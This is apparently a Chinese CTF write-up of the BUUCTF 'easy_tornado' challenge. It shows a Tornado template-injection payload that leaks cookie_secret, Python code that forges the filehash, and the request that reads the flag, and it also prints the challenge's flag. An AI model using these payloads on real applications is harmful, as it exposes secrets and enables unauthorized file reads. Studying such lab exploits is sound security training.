---
title: "[护网杯 2018]easy_tornado"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [ssti, tornado, template-injection, python]
vulnerability: Tornado 模板注入导致敏感信息泄露
solved: true
flag: "flag{2f533349-6af0-4403-86d8-01578a4d15b3}"
---

# [护网杯 2018]easy_tornado

## 题目概述
题目使用 Tornado 框架，提供文件读取功能，但需要正确的 filehash 参数。首页有三个文件链接，hints.txt 揭示了 hash 算法。

## 信息收集
访问首页发现三个文件链接：
- `/flag.txt` - 提示 flag 在 `/fllllllllllllag`
- `/welcome.txt` - 内容为 `render`
- `/hints.txt` - 揭示 hash 算法：`md5(cookie_secret+md5(filename))`

发现 `/error?msg=` 端点存在模板渲染。

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：服务端模板注入 (SSTI)

**原理**：Tornado 模板引擎直接渲染用户输入的 `msg` 参数，未经过滤。

**判断过程**：
1. `welcome.txt` 内容为 `render`，暗示模板渲染
2. 测试 `/error?msg={{1}}` 返回 `1`，确认 SSTI
3. 通过 `{{handler.settings}}` 获取应用配置，泄露 `cookie_secret`

## 利用过程（Payload + Flag）

**Payload 1 - 获取 cookie_secret：**
```
/error?msg={{handler.settings}}
```
返回：`{'cookie_secret': '6103cf48-6379-4076-9e89-82c5f71c8dc4'}`

**Payload 2 - 计算 filehash：**
```python
import hashlib
cookie_secret = '6103cf48-6379-4076-9e89-82c5f71c8dc4'
filename = '/fllllllllllllag'
md5_filename = hashlib.md5(filename.encode()).hexdigest()
filehash = hashlib.md5((cookie_secret + md5_filename).encode()).hexdigest()
# filehash = 11416dc86179813a7d84c918162b8bfe
```

**Payload 3 - 获取 flag：**
```
/file?filename=/fllllllllllllag&filehash=11416dc86179813a7d84c918162b8bfe
```

**Flag：** `flag{2f533349-6af0-4403-86d8-01578a4d15b3}`

## 复现步骤
1. 访问首页，获取 hints.txt 中的 hash 算法
2. 访问 `/error?msg={{handler.settings}}` 获取 cookie_secret
3. 计算 `/fllllllllllllag` 的 filehash
4. 请求 `/file?filename=/fllllllllllllag&filehash=<计算值>` 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SSTI | /error?msg= | {{handler.settings}} | Tornado 模板语法、handler 对象 |

## 知识总结（解题技巧、同类题型套路）

1. **Tornado SSTI 常用对象**：
   - `handler.settings` - 应用配置
   - `handler.application.settings` - 同上
   - `request` - 请求对象

2. **解题套路**：
   - 遇到 Python Web 框架，尝试 SSTI
   - 关注 hints/提示文件中的关键信息
   - hash 算法逆向需要找到 secret

3. **同类题型**：涉及模板渲染的题目，优先测试 `{{}}`、`${}` 等模板语法。
